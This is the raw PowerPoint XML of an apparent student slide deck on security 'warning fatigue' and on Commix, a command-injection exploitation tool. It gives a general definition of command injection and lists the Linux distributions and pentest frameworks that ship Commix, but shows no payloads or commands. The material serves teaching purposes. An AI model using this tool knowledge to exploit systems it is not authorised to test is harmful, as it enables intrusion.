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2" r:id="rId1"/>
    <p:sldMasterId id="2147483734"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9D21D778-B565-4D7E-94D7-64010A445B68}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>10/30/2017</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Footer Placeholder 16"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="0" lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Slide Number Placeholder 28"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{2C6B1FF6-39B9-40F5-8B67-33C6354A3D4F}" type="slidenum">
              <a:rPr kumimoji="0" lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent3">
                  <a:shade val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Subtitle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a:xfrm>
            <a:off x="10566400" y="6416676"/>
            <a:ext cx="1016000" cy="365125"/>
          </a:xfrm>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8" name="Footer Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Slide Number Placeholder 8"/>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D21D778-B565-4D7E-94D7-64010A445B68}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>10/30/2017</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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{2C6B1FF6-39B9-40F5-8B67-33C6354A3D4F}" type="slidenum">
              <a:rPr kumimoji="0" lang="en-US" smtClean="0"/>
              <a:pPr/>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11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>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9D21D778-B565-4D7E-94D7-64010A445B68}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>10/30/2017</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Footer Placeholder 19"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:extLst/>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr kumimoji="0" lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Slide Number Placeholder 9"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:extLst/>
          </a:lstStyle>
          <a:p>
            <a:fld id="{2C6B1FF6-39B9-40F5-8B67-33C6354A3D4F}" type="slidenum">
              <a:rPr kumimoji="0" lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent3">
                  <a:shade val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>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8" name="Footer Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:extLst/>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Slide Number Placeholder 8"/>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9D21D778-B565-4D7E-94D7-64010A445B68}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>10/30/2017</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Footer Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:extLst/>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr kumimoji="0" lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Slide Number Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:extLst/>
          </a:lstStyle>
          <a:p>
            <a:fld id="{2C6B1FF6-39B9-40F5-8B67-33C6354A3D4F}" type="slidenum">
              <a:rPr kumimoji="0" lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>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11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:extLst/>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>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6" name="Footer Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:extLst/>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>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5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:extLst/>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>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3" name="Footer Placeholder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sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Slide Number Placeholder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Tree>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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{6464A1CE-F334-4569-8567-481CDB32841E}" type="datetime">
              <a:rPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8B8B8B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="100000"/>
                </a:lnSpc>
              </a:pPr>
              <a:t>10/30/2017</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>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sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>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r">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{E8949495-ED31-4BF8-B9F5-7EB9085CFB01}" type="slidenum">
              <a:rPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8B8B8B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:pPr algn="r">
                <a:lnSpc>
                  <a:spcPct val="100000"/>
                </a:lnSpc>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>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hyperlink" Target="https://tools.kali.org/exploitation-tools/commix"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hyperlink" Target="http://www.weaknetlabs.com/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://archstrike.org/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#183;https:/www.parrotsec.org/" TargetMode="External"/><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 Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#183;https:/www.kali.org/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#183;https:/backbox.org/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#183;http:/blackarch.org/"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183;https:/github.com/LionSec/katoolin" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/trustedsec/ptf" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#183;https:/github.com/x3omdax/PenBox" TargetMode="External"/><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 Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#183;https:/tools.pentestbox.com/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#183;https:/github.com/zardus/ctf-tools" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/sidaf/homebrew-pentest" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#183;https:/github.com/owtf/owtf" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#183;https:/github.com/Aptive/penetration-testing-tool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mailto:root@kali" TargetMode="External"/><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mailto:root@kali" TargetMode="External"/><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 Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://commixproject.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="//"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hyperlink" Target="https://tools.kali.org/exploitation-tools/commix"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914400" y="3125880"/>
            <a:ext cx="7570080" cy="3125520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1001"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" u="sng" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>“Warning Fatigue”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" b="0" u="sng" strike="noStrike" spc="-1" dirty="0">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" u="sng" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="DejaVu Sans"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>Commix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" u="sng" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>: Penetration Testing /Exploitation Tools</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" u="sng" strike="noStrike" spc="-1" dirty="0">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1001"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" u="sng" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>17MCS13 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="0" u="sng" strike="noStrike" spc="-1" dirty="0">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1001"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" u="sng" strike="noStrike" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SUNIL KUMAR VERMA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="0" u="sng" strike="noStrike" spc="-1" dirty="0">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="CustomShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8499960" y="6519600"/>
            <a:ext cx="3511080" cy="6696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000" b="1" strike="noStrike" cap="all" spc="-1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CENTRE FOR ADVANCE STUDIES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1" dirty="0">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1" dirty="0">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="1026" name="Object 2"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noChangeAspect="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2209800" y="609600"/>
          <a:ext cx="9301708" cy="1905000"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
            <p:oleObj spid="_x0000_s1026" name="Picture" r:id="rId5" imgW="7340915" imgH="1503171" progId="StaticMetafile">
              <p:embed/>
            </p:oleObj>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>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7" name="Title 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="562707" y="609600"/>
            <a:ext cx="10972800" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="5400" u="sng" dirty="0" smtClean="0"/>
              <a:t>“Warning fatigue”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5400" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Subtitle 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219200" y="2209800"/>
            <a:ext cx="10363200" cy="3733800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>“Warning fatigue” means browser users ignore up to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>70% </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>of security alerts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>” the researchers said. “Studies of Technically advanced  users such as Linux users could help improve their warning responses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>. Designers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>of new warning mechanisms should always perform an analysis of the number of times the system is projected to raise a warning, and security practitioners should consider the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>effects that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>warning architectures have on warning fatigue.”</a:t>
            </a:r>
          </a:p>
          <a:p>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245936"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Commix (short for [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>comm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>]and [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>njection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> e[x]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>ploiter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>) has a simple environment and it can be used, from web developers, penetration testers or even security researchers to test web applications with the view to find bugs, errors or vulnerabilities related to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0" smtClean="0"/>
              <a:t>command injection attacks. By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter . Commix is written in Python programming language.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>            Author: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Anastasios</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> Stasinopoulos </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>            License: GPLv3 </a:t>
            </a:r>
          </a:p>
          <a:p>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a:xfrm>
            <a:off x="1910080" y="359898"/>
            <a:ext cx="9875520" cy="1164102"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t>Command Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Subtitle 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1910080" y="1850064"/>
            <a:ext cx="9875520" cy="4245936"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation. </a:t>
            </a:r>
          </a:p>
          <a:p>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solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Commix: Penetration Testing /Exploitation Tools</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent3"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Subtitle 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1910080" y="1850064"/>
            <a:ext cx="9875520" cy="4322136"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Commix comes packaged on the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>official repositories of the following Linux distributions, so you can use the package manager to install it!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>ArchStrike</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>BlackArch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t> Linux </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>BackBox</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>Kali Linux </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>Parrot Security OS </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>Weakerthan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t> Linux</a:t>
            </a:r>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solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>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550736"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Commix also comes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>as a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>plugin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>, on the following penetration testing frameworks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" err="1" smtClean="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>TrustedSec's</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId3"/>
